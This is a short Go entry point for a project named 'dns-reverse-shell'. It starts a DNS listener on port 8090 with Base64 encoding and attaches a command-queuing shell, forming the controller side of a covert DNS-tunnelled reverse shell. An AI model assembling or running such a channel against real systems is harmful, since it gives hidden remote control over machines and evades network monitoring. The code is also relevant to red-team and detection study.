package main

import (
	"dns-reverse-shell/main/encoder"
	"dns-reverse-shell/main/protocol"
	"dns-reverse-shell/main/shell"
)

func main() {
	dnsServer := protocol.NewDnsServer("8090", encoder.NewBase64Encoder())
	dnsServer.Serve()
	s := shell.NewShell(dnsServer.QueueCommand)
	go s.Start()
}
